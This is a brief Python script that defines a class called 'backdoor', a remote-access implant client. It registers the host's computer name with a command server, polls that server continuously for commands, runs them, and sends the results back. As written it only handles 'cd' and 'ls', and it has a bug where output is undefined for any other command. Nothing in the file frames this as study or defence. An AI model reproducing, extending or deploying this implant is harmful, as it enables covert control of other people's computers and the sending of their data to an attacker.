import requests,time,os

class backdoor:
    def __init__(self, url="http://127.0.0.1:8000/"):
        self.url = url
        self.computer_id = None

        r = requests.get(self.url+"computer/name/"+os.environ.get("COMPUTERNAME"))
        if r.status_code == 404:
            self.computer_id = self.register(os.environ.get("COMPUTERNAME"))
        else:
            self.computer_id = r.json()['id']
        
        self.run()
    def register(self, computer_name):
        r = requests.post(self.url + "computer/create", json={"computer_name": computer_name})
        self.computer_id = r.json()
        return r.json()
    
    def get_commands(self):
        r = requests.get(self.url + f"computer/{self.computer_id}")
        return r.json()['commands']

    def command_delete(self, command):
        r = requests.delete(self.url + f"command/{command['id']}/delete")
        return r.json()
    
    def command_run(self, command):
        if command.startswith('cd'):
            output = os.chdir(command[3:])
        if command.startswith('ls'):
            output = "".join(os.listdir())
        print(output)
        requests.put(self.url + f"computer/{self.computer_id}/output/", json={"output": output})
    def run(self):
        x = 0
        while True:
            start = time.time()
            commands = self.get_commands()
            end = time.time()
            x += 1
            print(f"{round((end-start)*1000,1)}ms {x} request")
            for command in commands:
                print(command)
                self.command_run(command['name'])
                self.command_delete(command)
            time.sleep(0.1)


            
backdoor = backdoor()